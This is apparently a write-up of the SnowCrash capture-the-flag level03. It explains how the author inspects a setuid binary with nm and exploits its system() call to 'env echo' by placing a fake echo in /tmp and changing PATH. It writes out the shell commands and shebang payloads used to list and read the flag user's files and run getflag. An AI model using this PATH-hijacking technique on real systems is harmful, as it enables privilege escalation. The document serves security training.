# Write up

Now, we have an executable named `level03`
We can use nm, so we check the used functions with `nm -u level03` which returns us :
```
         w _Jv_RegisterClasses
         w __gmon_start__
         U __libc_start_main@@GLIBC_2.0
         U getegid@@GLIBC_2.0
         U geteuid@@GLIBC_2.0
         U setresgid@@GLIBC_2.0
         U setresuid@@GLIBC_2.0
         U system@@GLIBC_2.0
```

By analysing the function calls, the program seems to simply execute a shell command, like `cat exploit_me.txt`
I try to trick the program :
```
level03@SnowCrash:~$ whereis echo
echo: /bin/echo /usr/share/man/man1/echo.1.gz
level03@SnowCrash:~$ whereis cat
cat: /bin/cat /usr/share/man/man1/cat.1.gz
level03@SnowCrash:~$ cp /bin/echo /tmp/cat
level03@SnowCrash:~$ export PATH=/tmp:/usr/bin
level03@SnowCrash:~$ ./level03
```
I change the PATH and copy echo (and rename it to cat) in the tmp folder to make the program run echo instead of cat.
But, as I didn't expected : `/usr/bin/env: echo: No such file or directory`
The program currently try to execute `/usr/bin/env echo`

By trying to change echo to cat :
```
level03@SnowCrash:~$ /bin/cp /bin/cat /tmp/echo
level03@SnowCrash:~$ ./level03
echo: Exploit: Permission denied
echo: me: Permission denied
```
We now know that the C system function call is `system("echo Exploit me")`;
After reading the `/etc/passwd` file (see level01), we know that the flag03 home folder is located at `/home/flag/flag03`
We try to list the files inside this folder with this payload : `/bin/echo '#!/bin/ls /home/flag/flag03' > /tmp/echo; ./level03`
This home folder contains a `README.txt` file
Using this payload : `/bin/echo '#!/bin/cat /home/flag/flag03/README.txt' > /tmp/echo;./level03`, we get a `Don't forget to launch getflag !` message.
We finally get the flag using this final payload :
```
/bin/echo '#!/bin/getflag' > /tmp/echo
```

# Softs

- nm